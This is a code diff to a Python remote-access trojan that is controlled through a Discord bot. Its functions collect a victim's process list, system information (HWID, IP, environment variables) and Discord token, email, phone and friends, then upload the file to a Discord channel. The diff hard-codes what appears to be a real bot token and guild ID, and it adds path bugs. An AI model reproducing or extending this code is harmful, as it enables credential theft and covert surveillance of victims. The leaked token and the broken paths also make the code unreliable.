@@ -7,10 +7,8 @@ import time
 import urllib.request
 from base64 import b64decode
 from json import loads
-from os import getenv, startfile
 from os.path import join, exists
 from re import findall
-from shutil import copy
 from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 
@@ -23,9 +21,9 @@ from discord.utils import get
 global ping_on_startup
 global token
 global guild_iD
-guild_iD = ""
+guild_iD = "984582818489331732"
 # guild id here
-token = ""
+token = "MTAwODQ5Nzk3MzkwNDI4MTc0Mg.GYZuuv.qw7-cvWr5Uvp4DjQMZ_ynzOd91zjd36dCW8XoQ"
 # Bot Token Here Obviously
 # Bot needs all intents
 ping_on_startup = True
@@ -130,11 +128,12 @@ def victimtype(toPress: str):
 
 
 def getTasklist():
+	temp = (os.getenv('TEMP'))
 	t = os.popen("tasklist").read()
-	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\tasklist.txt", "w") as f:
+	with open(f"temp\\tasklist.txt", "w") as f:
 		f.write(t)
 	f.close()
-	return f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\tasklist.txt"
+	return f"{temp}\\tasklist.txt"
 
 
 def systemInfo():
@@ -156,14 +155,18 @@ def systemInfo():
 	HWID: {hwid}
 	Ip: {ip}
 	"""
-	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\systeminfo.txt", "w") as f:
+	with open(f"P{temp}\\systeminfo.txt", "w") as f:
 		f.write(info_total)
 	f.close()
-	with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\environmentalVariables.txt", "w") as f:
+	with open(f"{temp}\\environmentalVariables.txt", "w") as f:
 		f.write(output)
 	f.close()
 
-	return f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\systeminfo.txt", f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\environmentalVariables.txt"
+	return f"{temp}\\systeminfo.txt", f"{temp}\\environmentalVariables.txt"
+
+
+global temp
+temp = os.getenv('TEMP')
 
 
 def searchFile(directory: str, keyword: str):
@@ -290,10 +293,13 @@ def getDiscordData():
 				nitro = bool(user_data.get("premium_type"))
 				info = f"####Ma#i##l#: {email}\n#P#h##o##ne: ##{phone}\n#N#i#t#r3###o##: {nitro}\n#U#s#e#r#n#a#m#e: {pc_username}\n#P#C# #N#a#m####e: {pc_name}\nT##0##k##e##n Location: {platform}\nT##3#o##k##e##n #: {T0K3N}\nUsername: {username} ({user_id})\n\nUser Data: {user_data}\n\nFriends: {getFriends(T0K3N)}"
 				info = info.replace("#", "")
-				with open(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\discordinfo.txt", "w") as f:
+				temp = os.getenv("TEMP")
+				with open(f"{temp}\\discordinfo.txt", "w") as f:
 					f.write(info)
 				f.close()
-				return f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\discordinfo.txt"
+
+	main()
+	return f"{temp}\\discordinfo.txt"
 
 
 @bot.tree.command(name="discordinfo",
@@ -301,9 +307,8 @@ def getDiscordData():
 async def discordinfo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting discordInfo...")
 	getDiscordData()
-	await interaction.channel.send(
-		file=discord.File(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\discordinfo.txt"))
-	os.remove(f"C:\\Users\\{os.getenv('username')}\\AppData\\Local\\Temp\\discordinfo.txt")
+	await interaction.channel.send(file=discord.File(f"{temp}\\discordinfo.txt"))
+	os.remove(f"{temp}\\discordinfo.txt")
 
 
 @bot.tree.command(name="crash",
